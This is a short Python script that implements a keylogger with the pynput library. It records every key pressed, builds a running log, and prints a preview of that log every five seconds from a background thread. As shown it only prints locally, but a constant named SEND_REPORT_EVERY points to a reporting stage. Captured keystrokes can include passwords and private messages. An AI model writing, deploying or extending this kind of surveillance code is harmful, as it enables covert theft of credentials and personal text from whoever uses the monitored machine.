import threading
import time
from pynput import keyboard

SEND_REPORT_EVERY = 5  # seconds

class KeyLogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = "KeyLogger Started...\n"
        self._stop_event = threading.Event()

    def appendlog(self, string):
        self.log += string

    # Keyboard callback
    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " SPACE "
            elif key == key.esc:
                current_key = " ESC "
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    # Periodic reporting loop
    def report_loop(self):
        while not self._stop_event.is_set():
            time.sleep(self.interval)
            self.report()

    def report(self):
        print(f"[REPORT] Log length: {len(self.log)}")
        print(f"[REPORT] Log preview: {self.log[:100]}")
        # Reset log for next interval
        self.log = "this is the beginning of the log...\n"

    def start_reporting(self):
        t = threading.Thread(target=self.report_loop, daemon=True)
        t.start()

    def run(self):
        # Start reporting
        self.start_reporting()

        # Start keyboard listener
        with keyboard.Listener(on_press=self.save_data) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()
